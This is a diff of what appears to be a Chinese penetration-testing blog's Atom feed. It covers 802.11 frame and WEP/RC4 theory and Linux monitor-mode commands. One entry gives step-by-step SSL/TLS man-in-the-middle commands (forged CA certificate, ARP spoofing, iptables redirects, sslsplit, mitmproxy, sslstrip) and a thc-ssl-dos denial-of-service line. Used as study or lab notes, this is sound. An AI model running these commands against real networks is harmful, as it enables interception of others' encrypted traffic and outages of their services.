@@ -39,28 +39,6 @@
   </entry>
   
   <entry>
-    <title>Wireless_Attacks/无线技术理论/WEP加密-RC4算法</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/</id>
-    <published>2020-05-18T05:59:28.907Z</published>
-    <updated>2020-04-06T04:24:53.524Z</updated>
-    
-    <content type="html"><![CDATA[<p>加密<br>    无线安全根源<br>        802.11基于无线电波发射信息<br>        嗅探侦听是主要问题<br>        加密机制是必须手段<br>    Wired Equivalent Privacy(WEP)<br>        802.11标准的一部分<br>        发布后不久被发现存在安全漏洞<br>    Wi-Fi Protected Access(WPA)取代WEP<br>        WPA2(802.11i 标准)</p><p>OPEN无加密网络<br>    无任何加密机制<br>    所有数据都可以被嗅探<br>    STA和AP只协商拼配参数即可连入网络        </p><p>WEP加密<br>    使用Rivest Cipher 4(RC4)算法加密流量内容,实现机密性<br>    CRC32算法检查数据完整性<br>    标准采用使用24位initialization vector(IV)<br>    受美国加密技术出口限制法律的要求<br>        高于64bit key禁止出口<br>        所以除24bit IV之外真实的key只有40bit的版本被允许出口<br>        出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)<br>RC4算法<br>    RSA实验室研发的对称加密流算法<br>        实现简单<br>        速度快<br>    加密:对明文流和密钥流进行XOR计算(XOR:二进制异或运算)<br>    解密:对密文流和密钥流进行XOR计算<br>    RC4算法key由两个过程生成<br>        合并IV和PSK,利用Key Scheduling Algorithm(KSA)算法生成起始状态表<br>        Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流<br>RC4算法加密流程<br>RC4算法解密流程</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;加密&lt;br&gt;    无线安全根源&lt;br&gt;        802.11基于无线电波发射信息&lt;br&gt;        嗅探侦听是主要问题&lt;br&gt;        加密机制是必须手段&lt;br&gt;    Wired Equivalent Privacy(WEP)&lt;br&gt;        80
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>Wireless_Attacks/无线技术理论/RADIOTAP头部</title>
     <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/"/>
     <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/</id>
@@ -83,65 +61,19 @@
   </entry>
   
   <entry>
-    <title>Wireless_Attacks/无线技术理论/Management Frame</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/</id>
+    <title>Wireless_Attacks/无线技术理论/WEP加密-RC4算法</title>
+    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/"/>
+    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/</id>
     <published>2020-05-18T05:59:28.907Z</published>
-    <updated>2020-04-05T14:38:02.876Z</updated>
+    <updated>2020-04-06T04:24:53.524Z</updated>
     
-    <content type="html"><![CDATA[<p>Management Frame(管理帧)<br>用于协商和控制STA与AP之间的关系</p><p>Beacon Frames(是由AP发出来的帧)<br>AP发送的广播帧,通告无线网络的存在(BSSID)<br>发包频率<br>    102.4ms(可变)<br>    时间单位1024microsecond(60秒)<br>SSID网络名<br>    隐藏AP不发SSID广播<br>IBSSI Status<br>    0:intrastructure<br>    1:ad-hcc<br>Privicy<br>    WEP\WPA加密<br>ESSID<br>    名称,长度<br>速率<br>    802.11 g(1–54Mbit)<br>信道<br>    11</p><p>Probe Request Frames(由STA发出的扫描请求帧)<br>用于STA扫描现有AP<br>    发现连接过的AP<br>    发现未连接过的AP</p><p>Probe Response Frames(由AP返回的响应帧)<br>发现连接过的AP时,速率和ESSID相同的AP响应</p><p>Authentication Frames(身份认证)<br>    Authentication Algorithm身份认证类型<br>    0:开放系统身份验证<br>    1:共享密钥身份验证<br>身份认证由多个帧交换过程组成<br>Authentication Seq<br>    每次身份验证过程Seq唯一<br>    1-65535<br>Challenge text<br>    只有共享密钥方式才有此字段<br>Status Code:成功/失败</p><p>Association/Reassociation Frames(关联/重关联帧)<br>身份验证成功后,STA执行关联操作,加入无线网络<br>    Association Request    Frames<br>    Reassociation Request Frames<br>    Association Response Frames</p><p>Disassociation/Deauthentication(由AP发出)<br>由AP发出<br>    2个字节</p><p>ATIM Frames<br>只在ad-hoc网络下使用<br>    STA使用此帧通知接收者其有缓存的数据要发送</p><p>Data Frames(数据帧)<br>传输用户数据<br>    DATA Frame<br>空数据帧<br>    Null data frame<br>    只包含MAC头和FCS<br>    STA用于声明自己将要进入省电模式</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Management Frame(管理帧)&lt;br&gt;用于协商和控制STA与AP之间的关系&lt;/p&gt;
-&lt;p&gt;Beacon Frames(是由AP发出来的帧)&lt;br&gt;AP发送的广播帧,通告无线网络的存在(BSSID)&lt;br&gt;发包频率&lt;br&gt;    102.4ms(可变)&lt;br&gt;  
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Wireless_Attacks/无线技术理论/Linux无线协议栈及配置命令</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/</id>
-    <published>2020-05-18T05:59:28.907Z</published>
-    <updated>2020-04-03T07:42:31.706Z</updated>
-    
-    <content type="html"><![CDATA[<p>802.11协议栈<br>leee80211<br>    iwconfig<br>    iwlist<br>mac80211<br>    iw</p><p>查看无线网卡<br>    ifconfig<br>    iwconfig<br>    iw list<br>信道频率<br>    iwlist wlan2 frequency<br>    iw list<br>扫描附近AP<br>iw dev wlan2 scan | grep SSID<br>iw dev wlan2 scan | egrep “DS\ Parameter\ set | SSID”    #扫描查看附近AP信道<br>iwlist wlan2 scanning | egrep “ESSID | Channel”            #扫描查看附近AP信道及频宽</p><p>log(signal/1mW)        #singnal无线强度接收值计算,0~-50 信号好,超过-130信号不可达</p><p>添加删除侦听端口<br>iw dev wlan2 interface add wlan2mon type monitor    #把无线网卡设置成monitor模式,进行无线数据抓包<br>    tcpdump -s 0 –i wlan2mon -p                    #tcpdump命令行抓包工具<br>    ifconfig wlan2mon up            #把wlan2mon设置成up状态<br>    service network-manager stop    #如果up不成功,停用network-manager服务<br>    service network-manager status    #network-manager服务状态查询<br>    vi ./bashrc                        #服务启动项配置<br>iw dev wlan2mon interface del</p><p>802.11<br>协议栈<br>    <a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a><br>无线驱动<br>    <a href="http://linuxwireless.org/en/users/Drivers/" target="_blank" rel="noopener">http://linuxwireless.org/en/users/Drivers/</a></p>]]></content>
+    <content type="html"><![CDATA[<p>加密<br>    无线安全根源<br>        802.11基于无线电波发射信息<br>        嗅探侦听是主要问题<br>        加密机制是必须手段<br>    Wired Equivalent Privacy(WEP)<br>        802.11标准的一部分<br>        发布后不久被发现存在安全漏洞<br>    Wi-Fi Protected Access(WPA)取代WEP<br>        WPA2(802.11i 标准)</p><p>OPEN无加密网络<br>    无任何加密机制<br>    所有数据都可以被嗅探<br>    STA和AP只协商拼配参数即可连入网络        </p><p>WEP加密<br>    使用Rivest Cipher 4(RC4)算法加密流量内容,实现机密性<br>    CRC32算法检查数据完整性<br>    标准采用使用24位initialization vector(IV)<br>    受美国加密技术出口限制法律的要求<br>        高于64bit key禁止出口<br>        所以除24bit IV之外真实的key只有40bit的版本被允许出口<br>        出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)<br>RC4算法<br>    RSA实验室研发的对称加密流算法<br>        实现简单<br>        速度快<br>    加密:对明文流和密钥流进行XOR计算(XOR:二进制异或运算)<br>    解密:对密文流和密钥流进行XOR计算<br>    RC4算法key由两个过程生成<br>        合并IV和PSK,利用Key Scheduling Algorithm(KSA)算法生成起始状态表<br>        Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流<br>RC4算法加密流程<br>RC4算法解密流程</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;802.11协议栈&lt;br&gt;leee80211&lt;br&gt;    iwconfig&lt;br&gt;    iwlist&lt;br&gt;mac80211&lt;br&gt;    iw&lt;/p&gt;
-&lt;p&gt;查看无线网卡&lt;br&gt;    ifconfig&lt;br&gt;    iwconfig&lt;br&gt;    iw list&lt;b
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Wireless_Attacks/无线技术理论/Control Frame</title>
-    <link href="http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/"/>
-    <id>http://c.cat.plus/2020/05/18/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/</id>
-    <published>2020-05-18T05:59:28.899Z</published>
-    <updated>2020-04-04T15:01:43.928Z</updated>
-    
-    <content type="html"><![CDATA[<p>Control Frame(控制帧)<br>    控制帧是一些通知设备开始,停止传输或连接失败等情况的短消息;<br>ACK<br>    接收端正确接收数据之后向发送端返回ACK确认<br>    每个单播帧需要ACK立刻确认<br>        组播和广播不需要ACK确认<br>    尽快响应<br>        由硬件完成,而非驱动层<br>    T/S:1/13<br>PS-POLL<br>    RF系统的放大器<br>        主要耗电的组件<br>        发射前放大信号,接收并放大还原信号<br>    省电模式<br>        关闭信号发射器节省电源耗电(几乎完全关闭)<br>    AID—-Association ID<br>    STA省电模式唤醒<br>        数据发送至AP(AP缓存数据包)<br>        通过Beacon发送TIM(traffic indication map)<br>            其中包含AID<br>        STA对比AID后唤醒网卡<br>        STA发送PS-Poll帧,请求从AP缓存中取回数据<br>            每个帧都需要ACK确认<br>            ACK确认完后AP从缓存中删除数据帧<br>            传输过程中STA保持唤醒状态<br>            传输结束后STA恢复省电状态<br>    AP接收PS-Poll帧<br>        立刻响应<br>        延迟响应<br>            简单响应帧<br>    AID:关联ID<br>    BSSID:STA正关联的AP地址<br>    TA:发送此帧的STA地址</p><p>RTS/CTS<br>    RTS/CTS是CSMA/CA方法的一种补充手段<br>        降低冲突产生的可能性<br>        正式通信之前通过请求应答机制,确信通信介质的可用性<br>        并锁定传输介质和预约通信时间<br>        只有在传输长帧时使用,传输短帧时不会使用<br>            驱动接口提供阈值的自定义<br>            大于阈值的帧被视为长帧,反之则视为短帧.<br>        Node1发送Request to Send包给Node2<br>        如果未发生冲突,Node2返回Clear to Send给Node1<br>        Node1传输数据<br>        数据正常接收,Node2返回ACK,否则Node1什么也不会收到.<br>    有线网络介质访问方式:CSMA/CD<br>    无线网络介质访问方法:CSMA/CA<br>    隐藏节点<br>    RTS帧长度20字节<br>    CTS帧长度14字节</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Control Frame(控制帧)&lt;br&gt;    控制帧是一些通知设备开始,停止传输或连接失败等情况的短消息;&lt;br&gt;ACK&lt;br&gt;    接收端正确接收数据之后向发送端返回ACK确认&lt;br&gt;    每个单播帧需要ACK立刻确认&lt;br&gt;        组播和广播不需要AC
+        &lt;p&gt;加密&lt;br&gt;    无线安全根源&lt;br&gt;        802.11基于无线电波发射信息&lt;br&gt;        嗅探侦听是主要问题&lt;br&gt;        加密机制是必须手段&lt;br&gt;    Wired Equivalent Privacy(WEP)&lt;br&gt;        80
       
     
     </summary>
@@ -250,9 +182,9 @@
     <link href="http://c.cat.plus/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
     <id>http://c.cat.plus/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
     <published>2014-05-19T10:02:37.000Z</published>
-    <updated>2020-05-21T07:51:03.026Z</updated>
+    <updated>2020-05-21T08:24:02.602Z</updated>
     
-    <content type="html"><![CDATA[<p>攻击者位于客户端和服务器通信链路中<br>    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人<br>    DHCP    // 动态主机配置协议,用来自动获取IP<br>    修改网关<br>    修改DNS<br>    修改HOSTS<br>    ICMP,STP,OSPF<br>加密流量        // 伪造证书解密</p><p>攻击的前提<br>客户端已经信任伪造证书颁发机构<br>攻击者控制了核发证书颁发机构<br>客户端程序禁止了显示证书错误告警信息<br>攻击者已经控制客户端,并强制其信任伪造证书</p><h4 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a><strong>SSLsplit</strong></h4><p>透明SSL/TLS中间人攻击工具<br>对客户端伪造成服务器,对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP,POP3,FTP等通信中间人攻击<br><strong>利用openssl生成证书私钥</strong><br>    <code>openssl genrsa -out ca.key 2048</code><br><strong>利用私钥签名生成证书</strong><br>    <code>openssl reg -new -x509 -days 1096 -key ca.key -out ca.crt</code></p><h4 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a><strong>启动路由</strong></h4><pre><code>sysctl -w net.ipv4.ip_forward=1cat /proc/sys/net/ipv4/ip_forwardecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h4 id="Iptables端口转发规则"><a href="#Iptables端口转发规则" class="headerlink" title="Iptables端口转发规则"></a><strong>Iptables端口转发规则</strong></h4><pre><code>iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3Siptables -t nat -L        //查看nat规则netstat -pantu | grep :80        //查看80端口是否被占用</code></pre><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><pre><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></pre><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a><strong>启动SSLsplit</strong></h4><pre><code>mkdir -p test/logdirsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></pre><p>被害者访问taobao,baidu,mail.163.com<br>查看日志和浏览器证书及证书报错信息<br>安装服务器根证书之后再次访问</p><h4 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a><strong>Mitmproxy</strong></h4><pre><code>iptables端口转发规则iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --toport 8080</code></pre><p>Mitmproxy和sslsplit类似,也需要先执行ARP欺骗,且有个BUG,iptables端口只能转发8080有效<br>     mitmproxy -T –host -w mitmproxy.log</p><h4 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a><strong>SSLstrip</strong></h4><p>与前两种工具不同,将客户端到中间人之间的流量变为明文<br>一样也需要结合ARP欺骗<br>    <code>sslstrip -l 8080</code></p><blockquote><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a><strong>SSL/TLS拒绝服务攻击</strong></h3></blockquote><ul><li>thc-ssl-dos<br>SSL协商加密对性能开销增加,大量握手请求会导致拒绝服务<br>利用SSL secure Renegotiation特性,在单一TCP连接中生成数千个SSL重连接请求,造成服务器资源过载<br>与流量式拒绝服务攻击不同,thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器<br>服务器平均可以处理300次/秒SSL握手请求<br>对SMTPS,POP3S等服务同样有效<br><code>thc-ssl-dos 1.1.1.1 443 -accept</code></li></ul><p>对策<br>禁用SSL-Renegotiation,使用SSL Accelerator<br>通过修改thc-ssl-dos代码,可以绕过以上对策    </p>]]></content>
+    <content type="html"><![CDATA[<p>攻击者位于客户端和服务器通信链路中<br>    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人<br>    DHCP    // 动态主机配置协议,用来自动获取IP<br>    修改网关<br>    修改DNS<br>    修改HOSTS<br>    ICMP,STP,OSPF<br>加密流量        // 伪造证书解密</p><p><strong>攻击的前提</strong></p><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端,并强制其信任伪造证书</li></ul><h4 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a><strong>SSLsplit</strong></h4><p>透明SSL/TLS中间人攻击工具<br>对客户端伪造成服务器,对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP,POP3,FTP等通信中间人攻击<br><strong>利用openssl生成证书私钥</strong><br>    <code>openssl genrsa -out ca.key 2048</code><br><strong>利用私钥签名生成证书</strong><br>    <code>openssl reg -new -x509 -days 1096 -key ca.key -out ca.crt</code></p><h4 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a><strong>启动路由</strong></h4><pre><code>sysctl -w net.ipv4.ip_forward=1cat /proc/sys/net/ipv4/ip_forwardecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h4 id="Iptables端口转发规则"><a href="#Iptables端口转发规则" class="headerlink" title="Iptables端口转发规则"></a><strong>Iptables端口转发规则</strong></h4><pre><code>iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3Siptables -t nat -L        //查看nat规则netstat -pantu | grep :80        //查看80端口是否被占用</code></pre><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><pre><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></pre><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a><strong>启动SSLsplit</strong></h4><pre><code>mkdir -p test/logdirsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></pre><p>被害者访问taobao,baidu,mail.163.com<br>查看日志和浏览器证书及证书报错信息<br>安装服务器根证书之后再次访问</p><h4 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a><strong>Mitmproxy</strong></h4><pre><code>iptables端口转发规则iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --toport 8080</code></pre><p>Mitmproxy和sslsplit类似,也需要先执行ARP欺骗,且有个BUG,iptables端口只能转发8080有效<br>     mitmproxy -T –host -w mitmproxy.log</p><h4 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a><strong>SSLstrip</strong></h4><p>与前两种工具不同,将客户端到中间人之间的流量变为明文<br>一样也需要结合ARP欺骗<br>    <code>sslstrip -l 8080</code></p><blockquote><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a><strong>SSL/TLS拒绝服务攻击</strong></h3></blockquote><ul><li>thc-ssl-dos<br>SSL协商加密对性能开销增加,大量握手请求会导致拒绝服务<br>利用SSL secure Renegotiation特性,在单一TCP连接中生成数千个SSL重连接请求,造成服务器资源过载<br>与流量式拒绝服务攻击不同,thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器<br>服务器平均可以处理300次/秒SSL握手请求<br>对SMTPS,POP3S等服务同样有效<br><code>thc-ssl-dos 1.1.1.1 443 -accept</code></li></ul><p>对策<br>禁用SSL-Renegotiation,使用SSL Accelerator<br>通过修改thc-ssl-dos代码,可以绕过以上对策    </p>]]></content>
     
     <summary type="html">
     
@@ -440,6 +372,105 @@
       <category term="提权" scheme="http://c.cat.plus/tags/%E6%8F%90%E6%9D%83/"/>
     
       <category term="pinjector" scheme="http://c.cat.plus/tags/pinjector/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux无线协议栈及配置命令</title>
+    <link href="http://c.cat.plus/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
+    <id>http://c.cat.plus/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/</id>
+    <published>2013-05-27T10:01:09.000Z</published>
+    <updated>2020-05-22T02:07:33.033Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="802-11协议栈"><a href="#802-11协议栈" class="headerlink" title="802.11协议栈"></a><strong>802.11协议栈</strong></h4><p>leee 80211<br>    iwconfig<br>    iwlist<br>mac80211<br>    iw</p><h4 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a><strong>查看无线网卡</strong></h4><pre><code>ifconfigiwconfigiw list</code></pre><h4 id="信道频率"><a href="#信道频率" class="headerlink" title="信道频率"></a><strong>信道频率</strong></h4><pre><code>iwlist wlan2 frequencyiw list</code></pre><h4 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a><strong>扫描附近AP</strong></h4><pre><code>iw dev wlan2 scan | grep SSIDiw dev wlan2 scan | egrep &quot;DS\ Parameter\ set | SSID&quot;    #扫描查看附近AP信道iwlist wlan2 scanning | egrep &quot;ESSID | Channel&quot;            #扫描查看附近AP信道及频宽</code></pre><p>log(signal/1mW)        #singnal无线强度接收值计算,0~-50 信号好,超过-130信号不可达</p><h4 id="添加删除侦听端口"><a href="#添加删除侦听端口" class="headerlink" title="添加删除侦听端口"></a><strong>添加删除侦听端口</strong></h4><pre><code>iw dev wlan2 interface add wlan2mon type monitor    #把无线网卡设置成monitor模式,进行无线数据抓包tcpdump -s 0 --i wlan2mon -p                    #tcpdump命令行抓包工具ifconfig wlan2mon up            #把wlan2mon设置成up状态service network-manager stop    #如果up不成功,停用network-manager服务service network-manager status    #network-manager服务状态查询vi ./bashrc                        #服务启动项配置iw dev wlan2mon interface del</code></pre><h5 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a><strong>802.11</strong></h5><p>协议栈<br>    <a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a><br>无线驱动<br>    <a href="http://linuxwireless.org/en/users/Drivers/" target="_blank" rel="noopener">http://linuxwireless.org/en/users/Drivers/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;802-11协议栈&quot;&gt;&lt;a href=&quot;#802-11协议栈&quot; class=&quot;headerlink&quot; title=&quot;802.11协议栈&quot;&gt;&lt;/a&gt;&lt;strong&gt;802.11协议栈&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;leee 80211&lt;br&gt;    iwconfi
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
+    
+    
+      <category term="802.11" scheme="http://c.cat.plus/tags/802-11/"/>
+    
+      <category term="无线协议" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE/"/>
+    
+      <category term="Monitor" scheme="http://c.cat.plus/tags/Monitor/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无线数据帧Management Frame原理</title>
+    <link href="http://c.cat.plus/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/"/>
+    <id>http://c.cat.plus/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/</id>
+    <published>2013-05-26T15:21:51.000Z</published>
+    <updated>2020-05-22T02:03:58.513Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="Management-Frame-管理帧"><a href="#Management-Frame-管理帧" class="headerlink" title="Management Frame(管理帧)"></a><strong>Management Frame(管理帧)</strong></h4><p>用于协商和控制STA与AP之间的关系</p><h4 id="Beacon-Frames-是由AP发出来的帧"><a href="#Beacon-Frames-是由AP发出来的帧" class="headerlink" title="Beacon Frames(是由AP发出来的帧)"></a><strong>Beacon Frames(是由AP发出来的帧)</strong></h4><p>AP发送的广播帧,通告无线网络的存在(BSSID)<br>发包频率<br>    102.4ms(可变)<br>    时间单位1024microsecond(60秒)<br><strong>SSID网络名</strong><br>隐藏AP不发SSID广播<br><strong>IBSSI Status</strong></p><ul><li>0:intrastructure</li><li>1:ad-hcc<br>Privicy</li><li>WEP\WPA加密<br>ESSID</li><li>名称,长度<br>速率</li><li>802.11 g(1–54Mbit)<br>信道</li><li>11</li></ul><h4 id="Probe-Request-Frames-由STA发出的扫描请求帧"><a href="#Probe-Request-Frames-由STA发出的扫描请求帧" class="headerlink" title="Probe Request Frames(由STA发出的扫描请求帧)"></a><strong>Probe Request Frames(由STA发出的扫描请求帧)</strong></h4><p>用于STA扫描现有AP<br>    发现连接过的AP<br>    发现未连接过的AP</p><h4 id="Probe-Response-Frames-由AP返回的响应帧"><a href="#Probe-Response-Frames-由AP返回的响应帧" class="headerlink" title="Probe Response Frames(由AP返回的响应帧)"></a><strong>Probe Response Frames(由AP返回的响应帧)</strong></h4><p>发现连接过的AP时,速率和ESSID相同的AP响应</p><h4 id="Authentication-Frames-身份认证"><a href="#Authentication-Frames-身份认证" class="headerlink" title="Authentication Frames(身份认证)"></a><strong>Authentication Frames(身份认证)</strong></h4><p>Authentication Algorithm身份认证类型<br>0:开放系统身份验证<br>1:共享密钥身份验证<br>身份认证由多个帧交换过程组成<br>Authentication Seq<br>    每次身份验证过程Seq唯一<br>    1-65535<br>Challenge text<br>    只有共享密钥方式才有此字段<br>Status Code:成功/失败</p><h4 id="Association-Reassociation-Frames-关联-重关联帧"><a href="#Association-Reassociation-Frames-关联-重关联帧" class="headerlink" 